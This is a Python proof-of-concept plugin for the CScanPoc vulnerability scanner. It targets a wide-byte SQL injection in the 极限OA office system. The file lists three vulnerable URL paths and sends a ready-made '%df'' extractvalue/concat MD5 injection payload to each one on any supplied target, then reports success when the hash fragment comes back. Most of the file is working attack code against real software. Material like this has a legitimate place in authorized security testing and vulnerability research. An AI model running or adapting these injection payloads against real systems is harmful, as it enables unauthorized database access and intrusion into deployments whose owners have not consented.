# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'SohuuOA_0002'  # 平台漏洞编号，留空
    name = '极限OA 宽字节 SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-07-16'  # 漏洞公布时间
    desc = '''
        极限OA网络智能办公系统是一款办公软件，运行环境支持Win9x/Me/NT/2000/XP/2003。
        /inc/finger/use_finger.php?USER_ID=-1%df
        /general/ems/manage/search_excel.php?LOGIN_USER_ID=1&EMS_TYPE=1%df
        /general/ems/query/search_excel.php?LOGIN_USER_ID=1%bf
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=0126661'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = '极限OA系统'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '5b34cad1-748a-4539-a89c-4ba1c6beb26c'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # __Refer___ = http://wooyun.org/bugs/wooyun-2010-0126661
            hh = hackhttp.hackhttp()
            payloads = (
                '/inc/finger/use_finger.php?USER_ID=-1%df',
                '/general/ems/manage/search_excel.php?LOGIN_USER_ID=1&EMS_TYPE=1%df',
                '/general/ems/query/search_excel.php?LOGIN_USER_ID=1%bf'
            )
            for payload in payloads:
                url = self.target + payload + \
                    '%27and%20extractvalue(1,%20concat(0x5c,(select%20MD5(520))))%23'
                code, head, res, errcode, _url = hh.http(url)
                if code == 200 and 'cf67355a3333e6e143439161adc2d82' in res:
                    # security_hole(url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
